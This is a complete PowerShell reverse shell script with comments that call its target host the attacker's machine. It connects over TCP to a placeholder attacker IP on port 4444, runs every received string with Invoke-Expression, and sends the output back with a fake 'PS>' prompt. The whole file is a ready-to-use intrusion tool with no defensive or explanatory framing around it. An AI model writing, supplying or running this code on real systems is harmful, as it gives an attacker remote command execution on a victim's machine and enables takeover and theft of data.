# Define the attacker IP and port
$attacker_ip = "IP address here"
$port = 4444 #change port if you want to

# Create a TCP connection to the attacker's machine
$client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

# Function to send and receive data
function Receive-Execute-Send {
    while(($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $cmd = $encoding.GetString($buffer, 0, $bytesRead)
        try {
            $output = (Invoke-Expression -Command $cmd 2>&1 | Out-String)
        } catch {
            $output = $_.Exception.Message
        }
        $response = $encoding.GetBytes($output + "PS> ")
        $stream.Write($response, 0, $response.Length)
    }
}

# Send initial prompt
$initialPrompt = $encoding.GetBytes("Connected to PowerShell reverse shell`nPS> ")
$stream.Write($initialPrompt, 0, $initialPrompt.Length)

# Start receiving and executing commands
Receive-Execute-Send

# Close the stream and client when done
$writer.Close()
$stream.Close()
$client.Close()
